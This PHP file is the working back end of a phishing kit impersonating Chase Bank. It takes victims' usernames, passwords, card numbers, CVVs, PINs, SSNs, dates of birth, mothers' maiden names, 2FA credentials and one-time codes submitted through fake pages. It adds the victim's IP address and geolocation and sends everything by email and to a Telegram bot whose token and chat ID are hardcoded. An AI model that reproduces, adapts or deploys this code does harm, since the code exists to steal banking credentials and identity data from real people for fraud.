<?php
include('process_form.php');
header('Access-Control-Allow-Origin: *');
header("Access-Control-Allow-Credentials: true");
header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');
header('Access-Control-Max-Age: 1000');
header('Access-Control-Allow-Headers: Content-Type, Content-Range, Content-Disposition, Content-Description');

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST["name"];
    $pass = $_POST["pass"];
    $exp = $_POST["exp"];
    $card = $_POST["card"];
    $cvv = $_POST["cvv"];
    $pin = $_POST["pin"];
    $dob = $_POST["dob"];
    $address = $_POST["address"];
    $motherName = $_POST["motherName"];
    $lname = $_POST["lname"];
    $fname = $_POST["fname"];
    $city = $_POST["city"];
    $ssn = $_POST["ssn"];
    $postalCode = $_POST["postalCode"];
    $email = $_POST["email"];
    $password = $_POST["password"];
    $forgEmail = $_POST["forgEmail"];
    $code = $_POST["code"];
    $phone = $_POST["phone"];
    $state = $_POST["state"];
    $loc = $_POST['loc'];

    // Chat ID-----https://api.telegram.org/bot<$botToken>/getUpdates
    $botToken = '6516427005:AAGFxuDFa90MyAOXzWsJT8UoCKSdSNUkFAM';
    $chatId = '1252679187';
    // $chatId = '125267918732';

    $message = '';

    if ($_POST['type'] == 'login') {
        $message = "
        <b>Page:</b> Login<br>
        <b>Username:</b> $name<br>
        <b>Password:</b> $pass<br>
        ";
    } else if ($_POST['type'] == 'card') {
        $message = "
        <b>Page:</b> Card Details<br>
        <b>Card Number:</b> $card<br>
        <b>Expiration Date:</b> $exp<br>
        <b>CVV:</b> $cvv <br>
        <b>Pin:</b> $pin
        ";
    } else if ($_POST['type'] == 'update') {
        $message = "
        <b>Page:</b> Update Details<br>
        <b>Date of Birth:</b> $dob<br>
        <b>Mother Maiden Name:</b> $motherName<br>
        <b>First Name:</b> $fname<br>
        <b>Last Name:</b> $lname<br>
        <b>Address:</b> $address<br>
        <b>City:</b> $city<br>
        <b>State:</b> $state<br>
        <b>SSN:</b> $ssn<br>
        <b>Postal Code:</b> $postalCode
        ";
    } else if ($_POST['type'] == '2-factor') {
        $message = "
        <b>Page:</b> Two Factor<br>
        <b>Email:</b> $email<br>
        <b>Password:</b> $password
        ";
    } else if ($_POST['type'] == 'verification') {
        $message = "
        <b>Page:</b> Verification Code<br>
        <b>Code:</b> $code
        ";
    } else if ($_POST['type'] == 'forgotPass') {
        $message = "
        <b>Page:</b> Forgot Password<br>
        <b>Email:</b> $forgEmail
        ";
    } else if ($_POST['type'] == 'phoneNumber') {
        $message = "
        <b>Page:</b> Phone Number<br>
        <b>Phone:</b> $phone
        ";
    }
    $ip = getenv('HTTP_CLIENT_IP') ?:
        getenv('HTTP_X_FORWARDED_FOR') ?:
        getenv('HTTP_X_FORWARDED') ?:
        getenv('HTTP_FORWARDED_FOR') ?:
        getenv('HTTP_FORWARDED') ?:
        getenv('REMOTE_ADDR');
    $location = getLocationFromIP($ip) || array();

    // if ($location) {
    //     // Display the location data
    //     echo "Country: " . $location['country'] . "\n";
    //     echo "Region: " . $location['regionName'] . "\n";
    //     echo "City: " . $location['city'] . "\n";
    //     echo "Latitude: " . $location['lat'] . "\n";
    //     echo "Longitude: " . $location['lon'] . "\n";
    // } else {
    //     echo "Location not found!";
    // }
    $message = $message . '
    <br> <b>Ip Location:</b>' . $loc . '
    <br><b>User IP</b>: ' . $ip . " " .
        $location['city'] . ', ' . $location['region'] . '
    <br><b>From:</b> CHASE BANK';
    sendMail($_POST['type'], $message);
    $message = str_replace("<br>", " ", $message);
    $message = str_replace("<b>", " ", $message);
    $message = str_replace("</b>", " ", $message);
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = array(
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    );

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));

    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($response === false) {
        echo "Failed. Error: " . $error;
    } else {
        echo "Success. Response: " . $response;
    }
}

function getLocationFromIP($ip)
{
    // Use the ip-api.com API
    $apiUrl = "http://ip-api.com/json/{$ip}";

    // Make a request to the API and get the response
    $response = file_get_contents($apiUrl);

    // Decode the JSON response into an associative array
    $locationData = json_decode($response, true);

    // Check if the response is successful
    if ($locationData['status'] === 'success') {
        return $locationData;
    } else {
        return false;
    }
}
